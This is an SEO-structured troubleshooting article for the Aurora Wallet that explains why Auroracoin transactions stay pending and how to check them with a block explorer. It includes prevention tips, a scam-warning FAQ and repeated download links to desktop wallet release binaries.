---
title: "Fixing Pending Auroracoin Transactions"
description: "Is your Auroracoin transaction stuck at 0 confirmations? Understand why transfers stay pending and how to verify their status on the blockchain safely."
primary_keyword: "aurora wallet transaction pending"
silo: "Troubleshooting"
updated: 2026-10-10
---

![Aurora Wallet](https://img.shields.io/badge/Aurora%20Wallet-2026.08.1.0-23685a) ![Platforms](https://img.shields.io/badge/Windows%20%C2%B7%20macOS%20%C2%B7%20Linux-desktop-23685a) ![License](https://img.shields.io/badge/License-MIT-23685a)

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

# Auroracoin Transaction Pending: What to Check and How to Fix

You sent Auroracoin, but the transaction status remains stuck at "0 confirmations," "pending," or "unconfirmed," and the recipient has not received the funds. This guide explains why transfers stay pending and the safe steps you can take to verify the status of your AUR transfer on the blockchain without risking double-spends or loss of funds.

The most critical rule when dealing with a pending transaction in the [Aurora Wallet](https://auroracoin.net) is to avoid sending the payment a second time. If the first transaction eventually confirms, you will have paid the recipient twice. Instead, use the steps below to determine if the transaction is simply delayed or if it never reached the network in the first place.

---

## You'll see this if

*   The [Aurora Wallet](https://auroracoin.net) transaction history shows "0 confirmations" or "pending" for an extended period, often exceeding the expected block time.
*   The transaction does not show up in the recipient's wallet balance or their view of the blockchain.
*   Your wallet interface displays a "Broadcasting" or "Stuck" status after a transfer attempt, with no progress for several minutes.
*   You are unsure if the payment was actually sent to the network because of a brief loss of internet connectivity during the "send" process.
*   The transaction appears in your wallet but results in a "Not Found" error when you attempt to view it on a public block explorer.

---

## Why this happens

Several factors can lead to a transaction remaining in the "pending" pool (often called the mempool):

### 1. Low Transaction Fees
Miners prioritize transactions that include higher fees because these fees are their primary incentive for securing the network. If your wallet was configured with a very low fee, or if network activity suddenly spiked after you sent the payment, miners may ignore your transaction in favor of others. It will remain pending until the network activity drops enough for your low fee to be competitive again.

### 2. Lack of Network Sync or Connectivity
If your wallet is not [fully synchronized](https://auroracoin.net/troubleshooting/wallet-not-syncing) with the blockchain, it may be showing you an outdated status. Alternatively, if your [Aurora Wallet](https://auroracoin.net) is not connected to any peers, the transaction may have never left your computer. It exists only in your local wallet file and has not been broadcast to the rest of the world.

### 3. Parent Transaction is Pending (UTXO Chain)
Auroracoin uses a system called Unspent Transaction Outputs (UTXOs). If you are spending Auroracoin that you recently received, and that incoming transaction is still pending, your outgoing payment cannot be confirmed until the "parent" transaction is settled. This is a common cause of delays when users try to move funds immediately after receiving them.

### 4. Chain Split Issues
If you are running an outdated wallet, you might be broadcasting transactions to an abandoned fork of the network. These transactions will never confirm on the main Auroracoin chain because they are effectively invisible to the miners following the consensus rules. Refer to our [chain split resync guide](15-chain-split-resync.md) for more information.

---

## The fix

Follow these steps to find the true status of your AUR and resolve the pending state:

### Step 1: Locate the Transaction ID (TXID)
In your [Aurora Wallet](https://auroracoin.net) transaction history, double-click the pending payment. Look for a long string of random letters and numbers called the Transaction ID or Hash. Copy this string to your clipboard. This ID is your proof of broadcast and is essential for verification.

### Step 2: Use an Auroracoin Block Explorer
Paste the TXID into the search bar of a public Auroracoin block explorer. The results will tell you the objective truth about the transaction:
*   **If the explorer shows confirmations:** Your transaction is successful. Your wallet or the recipient's wallet simply hasn't updated its display yet.
*   **If it shows "Unconfirmed":** The network knows about the transaction. You likely just need to wait longer. Check the "Fee per Byte" to see if it is high enough for current demand.
*   **If it says "Not Found":** The transaction never reached the blockchain. Your coins haven't moved, and the transaction only exists as a local record in your wallet.

### Step 3: Verify Connections and Sync
Check the corner of your wallet for the connection icon. If you have "0 active connections," your wallet cannot broadcast the transaction. Ensure your firewall is not blocking the app and that you are using the latest version from the [GitHub releases guide](07-github-releases-guide.md).

### Step 4: Rebroadcast the Transaction
If the transaction was never found on an explorer and your wallet is now synced, try restarting the [Aurora Wallet](https://auroracoin.net). Many desktop wallets will automatically attempt to rebroadcast any unconfirmed transactions once a stable connection to the network is established.

---

## If that didn't work

If the transaction remains "Unconfirmed" on the block explorer for a long period (often 72 hours or more), most nodes will eventually drop it from their mempool. The coins will then "reappear" in your wallet as spendable. 

> [!WARNING]
> Never attempt to "double spend" or force a new transaction with a higher fee until you are certain the original transaction has been dropped or you have the technical knowledge to use a feature like Replace-By-Fee (RBF), which is currently an advanced developer topic.

---

## Prevention

To avoid pending transactions in the future, follow these best practices:

*   **Trust Automatic Fee Guidance:** The [Aurora Wallet](https://auroracoin.net) is designed to suggest an appropriate fee based on current network activity. Avoid manually lowering the fee to the absolute minimum unless you are comfortable waiting days for a confirmation.
*   **Wait for Incoming Confirmations:** If you receive a payment, wait for at least one confirmation before attempting to spend those specific coins. This ensures the "parent" transaction is valid.
*   **Keep Your Software Current:** Ensure you are using the latest official release. Outdated wallets may not calculate fees correctly or may connect to fewer nodes, increasing the risk of broadcast failure.
*   **Check Sync Status:** Before clicking "Send," glance at the sync progress bar. If the wallet is still downloading blocks, your transaction might be delayed in appearing on your screen.

---

## Aurora Wallet Transaction Design

The new Aurora Wallet is designed to make the sending process transparent and predictable. It proposes several features to handle pending states more gracefully:

| Feature | Design Goal |
|---------|-------------|
| Dynamic Fee Guidance | Designed to suggest an appropriate fee based on real-time network traffic to prevent stuck payments. |
| One-Click Explorer Link | Designed to provide a direct link from your transaction history to a block explorer for instant verification. |
| Connection Check | Designed to warn you if you attempt to send a payment while the wallet is offline or out of sync. |
| Readable Status | Designed to replace cryptic codes with clear status messages like "Broadcasting," "Awaiting Block," and "Finalizing." |
| UTXO Awareness | Designed to warn users if they are attempting to spend unconfirmed incoming funds. |

These improvements are intended to reduce the stress of sending and receiving Auroracoin, providing a more professional experience for all users.

---

If the transaction stays pending, the [stuck transactions guide on auroracoin.net](https://auroracoin.net/troubleshooting/stuck-transactions) walks through the same checks with screenshots, and the [troubleshooting index](https://auroracoin.net/troubleshooting) covers related sync issues.

## FAQ

*   **Are my coins lost if a transaction is stuck?** No. Either the payment will confirm eventually, or it never reached the blockchain and the coins remain yours. Cryptocurrency cannot be "lost" in transit; it is either at the source address or the destination address according to the ledger.
*   **How many confirmations do I need?** It depends on who you are paying. Most exchanges require between 3 and 6 confirmations (representing different blocks added to the chain) before they credit your account.
*   **Should I send the payment again?** Not while the first is still pending. Always check a block explorer first to avoid paying twice.
*   **I sent AUR to the wrong address. Can I cancel it?** No. Once a transaction is confirmed by even one block, it is irreversible. Always double-check destination addresses, ideally using the [receiving addresses QR guide](31-receiving-addresses-qr.md).
*   **Someone offered to "unstick" my transaction for a fee. Is it safe?** No. This is a common scam. Never share your recovery words, private keys, or wallet files with anyone. No legitimate service requires these to help with a transaction.

---

## The current release

Aurora Wallet 2026.08.1.0 is the current desktop release for Windows, macOS and Linux:

[![Download for Windows](https://img.shields.io/badge/Download-Windows-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-23685a)](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/download/2026.08.1.0/aurora-wallet-v2026.08.1.0.zip)

Release notes and checksums: [Aurora Wallet 2026.08.1.0 release](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/tag/2026.08.1.0)

---

## Related articles

*   [Transaction Fees Guide](17-transaction-fees.md)
*   [Wallet Not Syncing](11-wallet-not-syncing.md)
*   [Chain Split Resync](15-chain-split-resync.md)
*   [Receiving Addresses QR](31-receiving-addresses-qr.md)
